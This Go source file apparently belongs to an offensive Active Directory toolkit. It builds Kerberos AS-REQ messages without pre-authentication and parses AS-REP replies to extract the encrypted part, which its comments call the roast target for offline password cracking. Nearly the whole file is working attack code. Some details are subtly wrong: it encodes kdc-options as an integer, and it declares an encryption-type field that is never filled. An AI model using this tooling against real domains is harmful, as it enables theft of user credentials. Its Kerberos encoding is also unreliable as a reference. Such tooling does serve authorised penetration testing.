package adgo

import (
	"encoding/binary"
	"errors"
	"fmt"
	"os"
	"time"
)

// AS-REQ construction and AS-REP parsing.
//
// The AS-REQ is the ticket-request message a Kerberos client sends to the
// KDC. For AS-REP roasting we build a minimal AS-REQ *without* pre-auth —
// that's the whole trick. If the user has DONT_REQ_PREAUTH set, the KDC
// answers with an AS-REP, and the AS-REP's encrypted part is crackable
// offline.
//
// AS-REQ structure (RFC 4120 §5.4.1):
//
//   AS-REQ ::= [APPLICATION 10] KDC-REQ
//
//   KDC-REQ ::= SEQUENCE {
//       pvno             [1] INTEGER (5),
//       msg-type         [2] INTEGER (10),
//       padata           [3] SEQUENCE OF PA-DATA OPTIONAL,
//       req-body         [4] KDC-REQ-BODY
//   }
//
//   KDC-REQ-BODY ::= SEQUENCE {
//       kdc-options             [0] KDCOptions,
//       cname                   [1] PrincipalName OPTIONAL,
//       realm                   [2] Realm,
//       sname                   [3] PrincipalName,
//       from                    [4] KerberosTime OPTIONAL,
//       till                    [5] KerberosTime,
//       rtime                   [6] KerberosTime OPTIONAL,
//       nonce                   [7] UInt32,
//       etype                   [8] SEQUENCE OF Int32,
//       addresses               [9] HostAddresses OPTIONAL,
//       enc-authorization-data  [10] EncryptedData OPTIONAL,
//       additional-tickets      [11] SEQUENCE OF Ticket OPTIONAL
//   }

// KDCOptions bits we care about.
const (
	KDCOptionForwardable  = 1 << 1
	KDCOptionRenewable    = 1 << 8
	KDCOptionCanonicalize = 1 << 15
	KDCOptionRenewableOK  = 1 << 27
)

// Encryption types (RFC 4120 §7.1, RFC 3962).
const (
	ETypeNull        = 0
	ETypeDES_CBC_CRC = 1
	ETypeDES_CBC_MD4 = 2
	ETypeDES_CBC_MD5 = 3
	ETypeRC4_HMAC    = 23
	ETypeAES128      = 17
	ETypeAES256      = 18
)

// ASREQOptions controls an AS-REQ construction.
type ASREQOptions struct {
	Realm     string  // CORP.LOCAL
	Username  string  // target user
	Service   string  // usually "krbtgt"
	ETypes    []int32 // default [23, 18, 17]
	Nonce     uint32  // random if 0
	KDOptions uint32  // default forwardable + renewable
}

// asreqDefaults fills empty fields.
func asreqDefaults(o ASREQOptions) ASREQOptions {
	if len(o.ETypes) == 0 {
		o.ETypes = []int32{ETypeRC4_HMAC, ETypeAES256, ETypeAES128}
	}
	if o.Service == "" {
		o.Service = "krbtgt"
	}
	if o.KDOptions == 0 {
		o.KDOptions = KDCOptionForwardable | KDCOptionRenewable
	}
	if o.Nonce == 0 {
		// nonce must be a positive int32
		o.Nonce = uint32(time.Now().UnixNano() & 0x7FFFFFFF)
	}
	return o
}

// BuildASREQ constructs the DER-encoded AS-REQ bytes. No padata — this
// is the AS-REP roast shape.
func BuildASREQ(opts ASREQOptions) ([]byte, error) {
	opts = asreqDefaults(opts)
	if opts.Realm == "" {
		return nil, errors.New("adgo: realm required")
	}
	if opts.Username == "" {
		return nil, errors.New("adgo: username required")
	}

	// --- KDC-REQ-BODY ---
	var body []byte

	// kdc-options [0] KDCOptions (a bit-string, encoded as a 32-bit integer)
	body = append(body, DERContextTag(0, false, DERInteger(int64(opts.KDOptions)))...)

	// cname [1] PrincipalName — the username being asked about
	cname := KerbPrincipal(1, []string{opts.Username})
	body = append(body, DERContextTag(1, true, cname)...)

	// realm [2] Realm — GeneralString
	body = append(body, DERContextTag(2, false, DERGeneralString(opts.Realm))...)

	// sname [3] PrincipalName — the service (krbtgt/REALM)
	snameComponents := []string{opts.Service, opts.Realm}
	if opts.Service == "krbtgt" {
		snameComponents = []string{"krbtgt", opts.Realm}
	}
	sname := KerbPrincipal(2, snameComponents)
	body = append(body, DERContextTag(3, true, sname)...)

	// till [5] KerberosTime
	till := time.Now().Add(24*time.Hour).UTC().Format("20060102150405") + "Z"
	body = append(body, KerbTime(5, till)...)

	// nonce [7] UInt32
	body = append(body, DERContextTag(7, false, DERInteger(int64(opts.Nonce)))...)

	// etype [8] SEQUENCE OF Int32
	var etypeSeq []byte
	for _, et := range opts.ETypes {
		etypeSeq = append(etypeSeq, DERInteger(int64(et))...)
	}
	body = append(body, DERContextTag(8, true, etypeSeq)...)

	// wrap body in KDC-REQ-BODY — actually the body *is* the [4] field
	bodyTagged := DERContextTag(4, true, body)

	// --- KDC-REQ header ---
	var req []byte
	// pvno [1] INTEGER 5
	req = append(req, DERContextTag(1, false, DERInteger(5))...)
	// msg-type [2] INTEGER 10 (AS-REQ)
	req = append(req, DERContextTag(2, false, DERInteger(10))...)
	// req-body [4]
	req = append(req, bodyTagged...)

	// wrap in SEQUENCE
	seq := DERSequence(req)

	// finally tag as [APPLICATION 10] AS-REQ
	return DERApplicationTag(10, true, seq), nil
}

// ASREPResult is the parsed AS-REP.
type ASREPResult struct {
	KDCREPMsgType int
	Realm         string
	EType         int32  // the etype of the enc-part (from EncryptedData [0])
	EncPart       []byte // the encrypted blob (the roast target)
	Raw           []byte
}

// ParseASREP pulls the encrypted part out of an AS-REP response. Returns
// the result or an error if the message isn't an AS-REP or lacks an
// enc-part.
//
// AS-REP ::= [APPLICATION 11] KDC-REP
//
//	KDC-REP ::= SEQUENCE {
//	    pvno       [0] INTEGER (5),
//	    msg-type   [1] INTEGER (11),
//	    padata     [2] SEQUENCE OF PA-DATA OPTIONAL,
//	    crealm     [3] Realm,
//	    cname      [4] PrincipalName,
//	    ticket     [5] Ticket,
//	    enc-part   [6] EncryptedData
//	}
func ParseASREP(b []byte) (*ASREPResult, error) {
	if len(b) < 2 {
		return nil, errors.New("adgo: short response")
	}
	r := NewDERReader(b)
	tag, content, err := r.ReadTLV()
	if err != nil {
		return nil, err
	}
	if TagClass(tag) != ClassApplication || TagNumber(tag) != 11 {
		return nil, fmt.Errorf("adgo: not an AS-REP (tag 0x%02x)", tag)
	}
	// content is the inner SEQUENCE
	r2 := NewDERReader(content)
	_, inner, err := r2.ReadTLV()
	if err != nil {
		return nil, err
	}
	// walk the KDC-REP fields looking for [6] enc-part
	rr := NewDERReader(inner)
	res := &ASREPResult{Raw: b}
	for {
		t, c, err := rr.ReadTLV()
		if err != nil {
			break
		}
		fieldNum := TagNumber(t)
		switch fieldNum {
		case 1:
			// msg-type
			if v, err := DecodeInteger(c); err == nil {
				res.KDCREPMsgType = int(v)
			}
		case 3:
			// crealm
			// inner TLV is a GeneralString
			sr := NewDERReader(c)
			_, sv, err := sr.ReadTLV()
			if err == nil {
				res.Realm = string(sv)
			}
		case 6:
			// enc-part — a SEQUENCE with etype, kvno, cipher
			// we want the cipher
			sr := NewDERReader(c)
			_, seqBytes, err := sr.ReadTLV()
			if err != nil {
				return nil, err
			}
			er := NewDERReader(seqBytes)
			for {
				et, ec, err := er.ReadTLV()
				if err != nil {
					break
				}
				if TagNumber(et) == 2 {
					// [2] cipher — OCTET STRING
					cr := NewDERReader(ec)
					_, cipherBytes, err := cr.ReadTLV()
					if err != nil {
						return nil, err
					}
					res.EncPart = cipherBytes
				}
			}
		}
	}
	if len(res.EncPart) == 0 {
		return nil, errors.New("adgo: no enc-part in AS-REP")
	}
	return res, nil
}

// helper used by the caller to write the AS-REQ to a file for testing.
func writeASREQFile(path string, b []byte) error {
	return os.WriteFile(path, b, 0o644)
}

var _ = binary.BigEndian
